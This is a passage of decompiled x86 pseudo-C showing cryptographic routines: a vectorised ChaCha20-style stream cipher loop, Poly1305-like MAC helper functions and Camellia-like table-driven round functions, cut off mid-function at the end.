      v90 = _mm_load_si128(&v646);
      v91 = _mm_load_si128(&v647);
      v92 = _mm_load_si128(&v648);
      v93 = _mm_add_epi32(_mm_load_si128(&v645), _EAX[4]);
      v628 = _mm_load_si128(&v643);
      v629 = v89;
      v630 = v93;
      v631 = v90;
      v632 = v91;
      v633 = v92;
      v645 = v93;
      v94 = _mm_load_si128(&v634);
      v95 = v93;
      v96 = _mm_load_si128(&v638);
      v97 = _mm_load_si128((const __m128i *)v642);
      v98 = _mm_load_si128((const __m128i *)&v642[16]);
      v99 = 10;
      do
      {
        v100 = _mm_add_epi32(v94, v96);
        v101 = _mm_shuffle_epi8(_mm_xor_si128(v95, v100), *_EAX);
        v102 = _mm_add_epi32(v97, v101);
        v103 = _mm_xor_si128(v96, v102);
        v104 = _mm_load_si128(&v623);
        v105 = _mm_or_si128(_mm_slli_epi32(v103, 0xCu), _mm_srli_epi32(v103, 0x14u));
        v106 = _mm_load_si128(&v619);
        v107 = _mm_load_si128(&v631);
        v618 = _mm_add_epi32(v100, v105);
        v108 = _mm_shuffle_epi8(_mm_xor_si128(v101, v618), _EAX[1]);
        v109 = _mm_add_epi32(v102, v108);
        v630 = v108;
        v110 = _mm_add_epi32(v106, v104);
        v111 = _mm_xor_si128(v105, v109);
        v626 = v109;
        v112 = _mm_shuffle_epi8(_mm_xor_si128(v107, v110), *_EAX);
        v622 = _mm_or_si128(_mm_slli_epi32(v111, 7u), _mm_srli_epi32(v111, 0x19u));
        v113 = _mm_add_epi32(v98, v112);
        v114 = _mm_load_si128(&v628);
        v115 = _mm_load_si128(&v624);
        v116 = _mm_xor_si128(v104, v113);
        v117 = _mm_or_si128(_mm_slli_epi32(v116, 0xCu), _mm_srli_epi32(v116, 0x14u));
        v118 = _mm_load_si128(&v620);
        v119 = _mm_load_si128(&v632);
        v619 = _mm_add_epi32(v110, v117);
        v120 = _mm_shuffle_epi8(_mm_xor_si128(v112, v619), _EAX[1]);
        v121 = _mm_add_epi32(v113, v120);
        v631 = v120;
        v122 = _mm_add_epi32(v118, v115);
        v123 = _mm_xor_si128(v117, v121);
        v627 = v121;
        v124 = _mm_shuffle_epi8(_mm_xor_si128(v119, v122), *_EAX);
        v623 = _mm_or_si128(_mm_slli_epi32(v123, 7u), _mm_srli_epi32(v123, 0x19u));
        v125 = _mm_add_epi32(v114, v124);
        v126 = _mm_load_si128(&v629);
        v127 = _mm_load_si128(&v625);
        v128 = _mm_xor_si128(v115, v125);
        v129 = _mm_or_si128(_mm_slli_epi32(v128, 0xCu), _mm_srli_epi32(v128, 0x14u));
        v130 = _mm_load_si128(&v621);
        v131 = _mm_load_si128(&v633);
        v620 = _mm_add_epi32(v122, v129);
        v132 = _mm_shuffle_epi8(_mm_xor_si128(v124, v620), _EAX[1]);
        v133 = _mm_add_epi32(v125, v132);
        v632 = v132;
        v134 = _mm_add_epi32(v130, v127);
        v135 = _mm_xor_si128(v129, v133);
        v136 = _mm_shuffle_epi8(_mm_xor_si128(v131, v134), *_EAX);
        v624 = _mm_or_si128(_mm_slli_epi32(v135, 7u), _mm_srli_epi32(v135, 0x19u));
        v137 = _mm_add_epi32(v126, v136);
        v138 = _mm_load_si128(&v623);
        v139 = _mm_xor_si128(v127, v137);
        v140 = _mm_or_si128(_mm_slli_epi32(v139, 0xCu), _mm_srli_epi32(v139, 0x14u));
        v141 = _mm_load_si128(&v618);
        v621 = _mm_add_epi32(v134, v140);
        v142 = _mm_shuffle_epi8(_mm_xor_si128(v136, v621), _EAX[1]);
        v143 = _mm_add_epi32(v137, v142);
        v144 = _mm_add_epi32(v141, v138);
        v145 = _mm_xor_si128(v140, v143);
        v146 = _mm_shuffle_epi8(_mm_xor_si128(v142, v144), *_EAX);
        v625 = _mm_or_si128(_mm_slli_epi32(v145, 7u), _mm_srli_epi32(v145, 0x19u));
        v147 = _mm_add_epi32(v133, v146);
        v148 = _mm_load_si128(&v624);
        v149 = _mm_xor_si128(v138, v147);
        v150 = _mm_or_si128(_mm_slli_epi32(v149, 0xCu), _mm_srli_epi32(v149, 0x14u));
        v151 = _mm_load_si128(&v619);
        v152 = _mm_load_si128(&v630);
        v618 = _mm_add_epi32(v144, v150);
        v153 = _mm_shuffle_epi8(_mm_xor_si128(v146, v618), _EAX[1]);
        v154 = _mm_add_epi32(v147, v153);
        v633 = v153;
        v155 = _mm_add_epi32(v151, v148);
        v156 = _mm_xor_si128(v150, v154);
        v628 = v154;
        v157 = _mm_shuffle_epi8(_mm_xor_si128(v152, v155), *_EAX);
        v623 = _mm_or_si128(_mm_slli_epi32(v156, 7u), _mm_srli_epi32(v156, 0x19u));
        v158 = _mm_add_epi32(v143, v157);
        v159 = _mm_load_si128(&v626);
        v160 = _mm_load_si128(&v625);
        v161 = _mm_xor_si128(v148, v158);
        v162 = _mm_or_si128(_mm_slli_epi32(v161, 0xCu), _mm_srli_epi32(v161, 0x14u));
        v163 = _mm_load_si128(&v620);
        v164 = _mm_load_si128(&v631);
        v619 = _mm_add_epi32(v155, v162);
        v165 = _mm_shuffle_epi8(_mm_xor_si128(v157, v619), _EAX[1]);
        v166 = _mm_add_epi32(v158, v165);
        v630 = v165;
        v167 = _mm_add_epi32(v163, v160);
        v168 = _mm_xor_si128(v162, v166);
        v629 = v166;
        v169 = _mm_shuffle_epi8(_mm_xor_si128(v164, v167), *_EAX);
        v624 = _mm_or_si128(_mm_slli_epi32(v168, 7u), _mm_srli_epi32(v168, 0x19u));
        v170 = _mm_add_epi32(v159, v169);
        v171 = _mm_load_si128(&v627);
        v172 = _mm_load_si128(&v622);
        v173 = _mm_xor_si128(v160, v170);
        v174 = _mm_or_si128(_mm_slli_epi32(v173, 0xCu), _mm_srli_epi32(v173, 0x14u));
        v175 = _mm_load_si128(&v621);
        v176 = _mm_load_si128(&v632);
        v620 = _mm_add_epi32(v167, v174);
        v177 = _mm_shuffle_epi8(_mm_xor_si128(v169, v620), _EAX[1]);
        v97 = _mm_add_epi32(v170, v177);
        v631 = v177;
        v178 = _mm_add_epi32(v175, v172);
        v179 = _mm_xor_si128(v174, v97);
        v180 = _mm_shuffle_epi8(_mm_xor_si128(v176, v178), *_EAX);
        v625 = _mm_or_si128(_mm_slli_epi32(v179, 7u), _mm_srli_epi32(v179, 0x19u));
        v181 = _mm_add_epi32(v171, v180);
        v182 = _mm_xor_si128(v172, v181);
        v183 = _mm_or_si128(_mm_slli_epi32(v182, 0xCu), _mm_srli_epi32(v182, 0x14u));
        v94 = _mm_load_si128(&v618);
        v95 = _mm_load_si128(&v630);
        v621 = _mm_add_epi32(v178, v183);
        v184 = _mm_shuffle_epi8(_mm_xor_si128(v180, v621), _EAX[1]);
        v98 = _mm_add_epi32(v181, v184);
        v632 = v184;
        v185 = _mm_xor_si128(v183, v98);
        v96 = _mm_or_si128(_mm_slli_epi32(v185, 7u), _mm_srli_epi32(v185, 0x19u));
        --v99;
      }
      while ( v99 );
      v622 = v96;
      v626 = v97;
      v627 = v98;
      v630 = v95;
      v632 = v184;
      v186 = _mm_add_epi32(_mm_load_si128(&v619), v635);
      v187 = _mm_add_epi32(_mm_load_si128(&v621), v637);
      v188 = _mm_add_epi32(v94, v634);
      v189 = _mm_unpacklo_epi32(v188, v186);
      v190 = _mm_add_epi32(_mm_load_si128(&v620), v636);
      v191 = _mm_unpacklo_epi32(v190, v187);
      v192 = _mm_unpackhi_epi32(v188, v186);
      v193 = _mm_unpackhi_epi32(v190, v187);
      v194 = v189;
      v195 = _mm_unpacklo_epi64(v189, v191);
      v196 = v192;
      v197 = _mm_unpacklo_epi64(v192, v193);
      v198 = _mm_unpackhi_epi64(v194, v191);
      v199 = _mm_unpackhi_epi64(v196, v193);
      v200 = _mm_loadu_si128(v82 - 8);
      v201 = _mm_loadu_si128(v82 - 4);
      v202 = _mm_loadu_si128(v82);
      v203 = _mm_loadu_si128(v82 + 4);
      v204 = v82 + 1;
      v205 = _mm_xor_si128(v200, v195);
      v206 = _mm_load_si128(&v622);
      v207 = _mm_xor_si128(v201, v198);
      v208 = _mm_load_si128(&v623);
      v209 = _mm_xor_si128(v197, v202);
      v210 = _mm_load_si128(&v624);
      v211 = _mm_xor_si128(v203, v199);
      v212 = _mm_load_si128(&v625);
      v83[-8] = v205;
      v83[-4] = v207;
      *v83 = v209;
      v83[4] = v211;
      v213 = v83 + 1;
      v214 = _mm_add_epi32(v208, v639);
      v215 = _mm_add_epi32(v212, v641);
      v216 = _mm_add_epi32(v206, v638);
      v217 = _mm_unpacklo_epi32(v216, v214);
      v218 = _mm_add_epi32(v210, v640);
      v219 = _mm_unpacklo_epi32(v218, v215);
      v220 = _mm_unpackhi_epi32(v216, v214);
      v221 = _mm_unpackhi_epi32(v218, v215);
      v222 = v217;
      v223 = _mm_unpacklo_epi64(v217, v219);
      v224 = v220;
      v225 = _mm_unpacklo_epi64(v220, v221);
      v226 = _mm_unpackhi_epi64(v222, v219);
      v227 = _mm_unpackhi_epi64(v224, v221);
      v228 = _mm_loadu_si128(v204 - 8);
      v229 = _mm_loadu_si128(v204 - 4);
      v230 = _mm_loadu_si128(v204);
      v231 = _mm_loadu_si128(v204 + 4);
      ++v204;
      v232 = _mm_xor_si128(v228, v223);
      v233 = _mm_load_si128(&v626);
      v234 = _mm_xor_si128(v229, v226);
      v235 = _mm_load_si128(&v627);
      v236 = _mm_xor_si128(v225, v230);
      v237 = _mm_load_si128(&v628);
      v238 = _mm_xor_si128(v231, v227);
      v239 = _mm_load_si128(&v629);
      v213[-8] = v232;
      v213[-4] = v234;
      *v213 = v236;
      v213[4] = v238;
      ++v213;
      v240 = _mm_add_epi32(v235, *(__m128i *)&v642[16]);
      v241 = _mm_add_epi32(v239, v644);
      v242 = _mm_add_epi32(v233, *(__m128i *)v642);
      v243 = _mm_unpacklo_epi32(v242, v240);
      v244 = _mm_add_epi32(v237, v643);
      v245 = _mm_unpacklo_epi32(v244, v241);
      v246 = _mm_unpackhi_epi32(v242, v240);
      v247 = _mm_unpackhi_epi32(v244, v241);
      v248 = v243;
      v249 = _mm_unpacklo_epi64(v243, v245);
      v250 = v246;
      v251 = _mm_unpacklo_epi64(v246, v247);
      v252 = _mm_unpackhi_epi64(v248, v245);
      v253 = _mm_unpackhi_epi64(v250, v247);
      v254 = _mm_loadu_si128(v204 - 8);
      v255 = _mm_loadu_si128(v204 - 4);
      v256 = _mm_loadu_si128(v204);
      v257 = _mm_loadu_si128(v204 + 4);
      ++v204;
      v258 = _mm_xor_si128(v254, v249);
      v259 = _mm_load_si128(&v630);
      v260 = _mm_xor_si128(v255, v252);
      v261 = _mm_load_si128(&v631);
      v262 = _mm_xor_si128(v251, v256);
      v263 = _mm_load_si128(&v632);
      v264 = _mm_xor_si128(v257, v253);
      v265 = _mm_load_si128(&v633);
      v213[-8] = v258;
      v213[-4] = v260;
      *v213 = v262;
      v213[4] = v264;
      ++v213;
      v266 = _mm_add_epi32(v261, v646);
      v267 = _mm_add_epi32(v265, v648);
      v268 = _mm_add_epi32(v259, v645);
      v269 = _mm_unpacklo_epi32(v268, v266);
      v270 = _mm_add_epi32(v263, v647);
      v271 = _mm_unpacklo_epi32(v270, v267);
      v272 = _mm_unpackhi_epi32(v268, v266);
      v273 = _mm_unpackhi_epi32(v270, v267);
      v274 = v269;
      v275 = _mm_unpacklo_epi64(v269, v271);
      v276 = v272;
      v277 = _mm_unpacklo_epi64(v272, v273);
      v278 = _mm_unpackhi_epi64(v274, v271);
      v279 = _mm_unpackhi_epi64(v276, v273);
      v280 = _mm_loadu_si128(v204 - 8);
      v281 = _mm_loadu_si128(v204 - 4);
      v282 = _mm_loadu_si128(v204);
      v283 = _mm_loadu_si128(v204 + 4);
      v82 = v204 + 13;
      v213[-8] = _mm_xor_si128(v280, v275);
      v213[-4] = _mm_xor_si128(v281, v278);
      *v213 = _mm_xor_si128(v277, v282);
      v213[4] = _mm_xor_si128(v283, v279);
      v83 = v213 + 13;
      v284 = v78 < 0x100;
      v78 -= 256;
    }
    while ( !v284 );
    v75 = v78 + 256;
    if ( !v75 )
      return (char)_EAX;
    v74 = v82 - 8;
    v76 = (const __m128i *)HIDWORD(v649);
    v73 = v83 - 8;
    v77 = _mm_or_si128(
            _mm_and_si128(_mm_loadu_si128(v650), _EAX[7]),
            _mm_add_epi32(_mm_cvtsi32_si128(v645.m128i_u32[0]), _EAX[6]));
  }
  v285 = _mm_load_si128(_EAX + 2);
  v286 = _mm_loadu_si128(v76);
  v287 = _mm_loadu_si128(v76 + 1);
  v288 = _mm_load_si128(_EAX);
  v289 = _mm_load_si128(_EAX + 1);
  v618 = v285;
  v619 = v286;
  v620 = v287;
  v621 = v77;
  for ( i = 10; ; i = 10 )
  {
    do
    {
      v291 = _mm_add_epi32(v285, v286);
      v292 = _mm_shuffle_epi8(_mm_xor_si128(v77, v291), v288);
      v293 = _mm_add_epi32(v287, v292);
      v294 = _mm_xor_si128(v286, v293);
      v295 = _mm_or_si128(_mm_srli_epi32(v294, 0x14u), _mm_slli_epi32(v294, 0xCu));
      v296 = _mm_add_epi32(v291, v295);
      v297 = _mm_shuffle_epi8(_mm_xor_si128(v292, v296), v289);
      v298 = _mm_add_epi32(v293, v297);
      v299 = _mm_xor_si128(v295, v298);
      v300 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v299, 0x19u), _mm_slli_epi32(v299, 7u)), 57);
      v301 = _mm_add_epi32(v296, v300);
      v302 = _mm_shuffle_epi8(_mm_xor_si128(_mm_shuffle_epi32(v297, 147), v301), v288);
      v303 = _mm_add_epi32(_mm_shuffle_epi32(v298, 78), v302);
      v304 = _mm_xor_si128(v300, v303);
      v305 = _mm_or_si128(_mm_srli_epi32(v304, 0x14u), _mm_slli_epi32(v304, 0xCu));
      v285 = _mm_add_epi32(v301, v305);
      v306 = _mm_shuffle_epi8(_mm_xor_si128(v302, v285), v289);
      v307 = _mm_add_epi32(v303, v306);
      v308 = _mm_xor_si128(v305, v307);
      v287 = _mm_shuffle_epi32(v307, 78);
      v286 = _mm_shuffle_epi32(_mm_or_si128(_mm_srli_epi32(v308, 0x19u), _mm_slli_epi32(v308, 7u)), 147);
      v77 = _mm_shuffle_epi32(v306, 57);
      --i;
    }
    while ( i );
    v309 = _mm_add_epi32(v285, v618);
    v310 = _mm_add_epi32(v286, v619);
    v311 = _mm_add_epi32(v287, v620);
    v312 = _mm_add_epi32(v77, v621);
    if ( v75 < 0x40 )
      break;
    v313 = _mm_xor_si128(v309, _mm_loadu_si128(v74));
    v314 = _mm_xor_si128(v310, _mm_loadu_si128(v74 + 1));
    v315 = _mm_xor_si128(v311, _mm_loadu_si128(v74 + 2));
    v316 = _mm_xor_si128(v312, _mm_loadu_si128(v74 + 3));
    v74 += 4;
    *v73 = v313;
    v73[1] = v314;
    v73[2] = v315;
    v73[3] = v316;
    v73 += 4;
    v75 -= 64;
    if ( !v75 )
      return (char)_EAX;
    v285 = _mm_load_si128(&v618);
    v286 = _mm_load_si128(&v619);
    v287 = _mm_load_si128(&v620);
    v77 = _mm_add_epi32(_mm_load_si128(_EAX + 5), v621);
    v621 = v77;
  }
  v618 = v309;
  v619 = v310;
  v620 = v311;
  v621 = v312;
  v317 = 0;
  do
  {
    v318 = v618.m128i_i8[v317];
    v319 = v74->m128i_i8[v317++];
    LOBYTE(_EAX) = v319 ^ v318;
    v73->m128i_i8[v317 - 1] = (char)_EAX;
    --v75;
  }
  while ( v75 );
  return (char)_EAX;
}
// 4ACF00: using guessed type int dword_4ACF00[13];
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004AD840) --------------------------------------------------------
int sub_4AD840()
{
  return 240;
}

//----- (004AD850) --------------------------------------------------------
int __cdecl sub_4AD850(_DWORD *a1, int a2)
{
  int result; // eax

  a1[48] = *(unsigned __int8 *)(a2 + 16) | ((*(unsigned __int8 *)(a2 + 17) | (*(unsigned __int16 *)(a2 + 18) << 8)) << 8);
  a1[49] = *(unsigned __int8 *)(a2 + 20) | ((*(unsigned __int8 *)(a2 + 21) | (*(unsigned __int16 *)(a2 + 22) << 8)) << 8);
  a1[50] = *(unsigned __int8 *)(a2 + 24) | ((*(unsigned __int8 *)(a2 + 25) | (*(unsigned __int16 *)(a2 + 26) << 8)) << 8);
  a1[51] = *(unsigned __int8 *)(a2 + 28) | ((*(unsigned __int8 *)(a2 + 29) | (*(unsigned __int16 *)(a2 + 30) << 8)) << 8);
  result = sub_4D1980(a1, (_DWORD *)a2, a1 + 57);
  a1[56] = 0;
  if ( !result )
  {
    a1[57] = sub_4D1A40;
    a1[58] = sub_4D1C20;
  }
  return result;
}

//----- (004AD920) --------------------------------------------------------
int (__cdecl *__cdecl sub_4AD920(char *a1, char *Src, size_t Size))(char *, char *, int, int)
{
  size_t v3; // ebx
  int v5; // ebp
  int (__cdecl *result)(char *, char *, int, int); // eax
  int v7; // edi
  char *v8; // ebp
  int v9; // edi
  unsigned int v10; // ebx
  int (__cdecl *v11)(char *, char *, int, int); // [esp+14h] [ebp+4h]

  v3 = Size;
  v5 = *((_DWORD *)a1 + 56);
  result = (int (__cdecl *)(char *, char *, int, int))*((_DWORD *)a1 + 57);
  v11 = result;
  if ( v5 )
  {
    v7 = 16 - v5;
    if ( Size < 16 - v5 )
    {
      result = (int (__cdecl *)(char *, char *, int, int))memcpy(&a1[v5 + 208], Src, Size);
      *((_DWORD *)a1 + 56) = Size + v5;
      return result;
    }
    memcpy(&a1[v5 + 208], Src, 16 - v5);
    result = (int (__cdecl *)(char *, char *, int, int))v11(a1, a1 + 208, 16, 1);
    v8 = &Src[v7];
    v3 = Size - v7;
  }
  else
  {
    v8 = Src;
  }
  v9 = v3 & 0xF;
  v10 = v3 - v9;
  if ( v10 >= 0x10 )
  {
    result = (int (__cdecl *)(char *, char *, int, int))v11(a1, v8, v10, 1);
    v8 += v10;
  }
  if ( v9 )
    result = (int (__cdecl *)(char *, char *, int, int))memcpy(a1 + 208, v8, v9);
  *((_DWORD *)a1 + 56) = v9;
  return result;
}

//----- (004AD9E0) --------------------------------------------------------
int __cdecl sub_4AD9E0(int a1, int a2)
{
  int v2; // eax
  void (__cdecl *v3)(int, int, int); // ebx
  void (__cdecl *v4)(int, int, int, _DWORD); // edi
  unsigned int v5; // eax

  v2 = *(_DWORD *)(a1 + 224);
  v3 = *(void (__cdecl **)(int, int, int))(a1 + 232);
  v4 = *(void (__cdecl **)(int, int, int, _DWORD))(a1 + 228);
  if ( v2 )
  {
    *(_BYTE *)(v2 + a1 + 208) = 1;
    v5 = v2 + 1;
    if ( v5 < 0x10 )
      memset((void *)(v5 + a1 + 208), 0, 16 - v5);
    v4(a1, a1 + 208, 16, 0);
  }
  v3(a1, a2, a1 + 192);
  return sub_4139E0((_BYTE *)a1, 0xF0u);
}

//----- (004ADBA0) --------------------------------------------------------
int __usercall sub_4ADBA0@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        _DWORD *a6@<edi>,
        int a7,
        int a8,
        int a9,
        int a10,
        _DWORD *a11)
{
  int v11; // eax
  int v12; // ebx
  int v13; // esi
  int v14; // ebx
  int v15; // edx
  int v16; // ecx
  int v17; // esi
  int v18; // edx
  int v19; // ebx
  int v20; // eax
  int v21; // esi
  int v22; // ebx
  int v23; // edx
  int v24; // ecx
  int v25; // esi
  int v26; // edx
  int v27; // ebx
  int v28; // eax
  int v29; // esi
  int v30; // ebx
  int v31; // edx
  int v32; // ecx
  int v33; // esi
  int v34; // edx
  int v35; // ebx
  int v36; // eax
  int v37; // esi
  int v38; // ebx
  int v39; // eax
  int v41; // [esp+4h] [ebp+4h]
  int v42; // [esp+4h] [ebp+4h]
  int v43; // [esp+4h] [ebp+4h]
  int v44; // [esp+8h] [ebp+8h]
  int v45; // [esp+8h] [ebp+8h]
  int v46; // [esp+8h] [ebp+8h]
  int v47; // [esp+Ch] [ebp+Ch]
  int v48; // [esp+Ch] [ebp+Ch]
  int v49; // [esp+Ch] [ebp+Ch]
  int v50; // [esp+Ch] [ebp+Ch]
  int i; // [esp+10h] [ebp+10h]
  int v52; // [esp+10h] [ebp+10h]
  int v53; // [esp+10h] [ebp+10h]
  int v54; // [esp+10h] [ebp+10h]

  v11 = *a6 ^ a1;
  v12 = a6[1] ^ a4;
  v13 = a6[4];
  v41 = v11;
  v44 = v12;
  v47 = a6[2] ^ a3;
  for ( i = a6[3] ^ a2; ; i = __ROL4__(a6[2] & v47, 1) ^ v54 )
  {
    v14 = a6[5] ^ v12;
    v15 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v13 ^ (unsigned int)v11) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v13 ^ (unsigned int)v11) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v13 ^ v11) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v13 ^ v11) >> 8) + 2052);
    v16 = *(_DWORD *)(a5 + 8 * BYTE2(v14) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v14) + 2048) ^ v15 ^ *(_DWORD *)(a5 + 8 * BYTE1(v14) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v14);
    v17 = a6[6];
    v52 = v16 ^ i ^ __ROR4__(v15, 8);
    v48 = v47 ^ v16;
    v18 = a6[7] ^ v52;
    v19 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v17 ^ (unsigned int)v48) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v17 ^ (unsigned int)v48) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v17 ^ v48) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v17 ^ v48) >> 8) + 2052);
    v20 = *(_DWORD *)(a5 + 8 * BYTE2(v18) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v18) + 2048) ^ v19 ^ *(_DWORD *)(a5 + 8 * BYTE1(v18) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v18);
    v21 = a6[8];
    v45 = v20 ^ v44 ^ __ROR4__(v19, 8);
    v42 = v41 ^ v20;
    v22 = a6[9] ^ v45;
    v23 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v21 ^ (unsigned int)v42) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v21 ^ (unsigned int)v42) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v21 ^ v42) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v21 ^ v42) >> 8) + 2052);
    v24 = *(_DWORD *)(a5 + 8 * BYTE2(v22) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v22) + 2048) ^ v23 ^ *(_DWORD *)(a5 + 8 * BYTE1(v22) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v22);
    v25 = a6[10];
    v53 = v24 ^ v52 ^ __ROR4__(v23, 8);
    v49 = v48 ^ v24;
    v26 = a6[11] ^ v53;
    v27 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v25 ^ (unsigned int)v49) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v25 ^ (unsigned int)v49) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v25 ^ v49) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v25 ^ v49) >> 8) + 2052);
    v28 = *(_DWORD *)(a5 + 8 * BYTE2(v26) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v26) + 2048) ^ v27 ^ *(_DWORD *)(a5 + 8 * BYTE1(v26) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v26);
    v29 = a6[12];
    v46 = v28 ^ v45 ^ __ROR4__(v27, 8);
    v43 = v42 ^ v28;
    v30 = a6[13] ^ v46;
    v31 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v29 ^ (unsigned int)v43) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v29 ^ (unsigned int)v43) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v29 ^ v43) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v29 ^ v43) >> 8) + 2052);
    v32 = *(_DWORD *)(a5 + 8 * BYTE2(v30) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v30) + 2048) ^ v31 ^ *(_DWORD *)(a5 + 8 * BYTE1(v30) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v30);
    v33 = a6[14];
    v54 = v32 ^ v53 ^ __ROR4__(v31, 8);
    v50 = v49 ^ v32;
    v34 = a6[15] ^ v54;
    v35 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v33 ^ (unsigned int)v50) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v33 ^ (unsigned int)v50) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v33 ^ v50) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v33 ^ v50) >> 8) + 2052);
    v36 = *(_DWORD *)(a5 + 8 * BYTE2(v34) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v34) + 2048) ^ v35 ^ *(_DWORD *)(a5 + 8 * BYTE1(v34) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v34);
    v37 = a6[16];
    v38 = v36 ^ v46 ^ __ROR4__(v35, 8);
    v39 = v43 ^ v36;
    a6 += 16;
    if ( a6 == a11 )
      break;
    v12 = __ROL4__(v39 & v37, 1) ^ v38;
    v44 = v12;
    v47 = v50 ^ (a6[3] | v54);
    v11 = (v12 | a6[1]) ^ v39;
    v41 = v11;
    v13 = a6[4];
  }
  return v37 ^ v50;
}

//----- (004ADFD0) --------------------------------------------------------
int __usercall sub_4ADFD0@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        _DWORD *a6@<edi>,
        int a7,
        int a8,
        int a9,
        int a10,
        _DWORD *a11)
{
  int v11; // eax
  int v12; // ebx
  int v13; // esi
  int v14; // ebx
  int v15; // edx
  int v16; // ecx
  int v17; // esi
  int v18; // edx
  int v19; // ebx
  int v20; // eax
  int v21; // esi
  int v22; // ebx
  int v23; // edx
  int v24; // ecx
  int v25; // esi
  int v26; // edx
  int v27; // ebx
  int v28; // eax
  int v29; // esi
  int v30; // ebx
  int v31; // edx
  int v32; // ecx
  int v33; // esi
  int v34; // edx
  int v35; // ebx
  int v36; // eax
  int v37; // esi
  int v38; // ebx
  int v39; // eax
  int v41; // [esp+4h] [ebp+4h]
  int v42; // [esp+4h] [ebp+4h]
  int v43; // [esp+4h] [ebp+4h]
  int v44; // [esp+8h] [ebp+8h]
  int v45; // [esp+8h] [ebp+8h]
  int v46; // [esp+8h] [ebp+8h]
  int v47; // [esp+Ch] [ebp+Ch]
  int v48; // [esp+Ch] [ebp+Ch]
  int v49; // [esp+Ch] [ebp+Ch]
  int v50; // [esp+Ch] [ebp+Ch]
  int i; // [esp+10h] [ebp+10h]
  int v52; // [esp+10h] [ebp+10h]
  int v53; // [esp+10h] [ebp+10h]
  int v54; // [esp+10h] [ebp+10h]

  v11 = *a6 ^ a1;
  v12 = a6[1] ^ a4;
  v13 = *(a6 - 2);
  v41 = v11;
  v44 = v12;
  v47 = a6[2] ^ a3;
  for ( i = a6[3] ^ a2; ; i = __ROL4__(*a6 & v47, 1) ^ v54 )
  {
    v14 = *(a6 - 1) ^ v12;
    v15 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v13 ^ (unsigned int)v11) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v13 ^ (unsigned int)v11) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v13 ^ v11) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v13 ^ v11) >> 8) + 2052);
    v16 = *(_DWORD *)(a5 + 8 * BYTE2(v14) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v14) + 2048) ^ v15 ^ *(_DWORD *)(a5 + 8 * BYTE1(v14) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v14);
    v17 = *(a6 - 4);
    v52 = v16 ^ i ^ __ROR4__(v15, 8);
    v48 = v47 ^ v16;
    v18 = *(a6 - 3) ^ v52;
    v19 = *(_DWORD *)(a5 + 8 * (unsigned __int8)((v17 ^ (unsigned int)v48) >> 16) + 2048) ^ *(_DWORD *)(a5 + 8 * ((v17 ^ (unsigned int)v48) >> 24)) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)(v17 ^ v48) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)((unsigned __int16)(v17 ^ v48) >> 8) + 2052);
    v20 = *(_DWORD *)(a5 + 8 * BYTE2(v18) + 2052) ^ *(_DWORD *)(a5 + 8 * HIBYTE(v18) + 2048) ^ v19 ^ *(_DWORD *)(a5 + 8 * BYTE1(v18) + 4) ^ *(_DWORD *)(a5 + 8 * (unsigned __int8)v18);
    v21 = *(a6 - 6);
    v45 = v20 ^ v44 ^ __ROR4__(v19, 8);
    v42 = v41 ^ v20;
    v22 = *(a6 - 5) ^ v45;
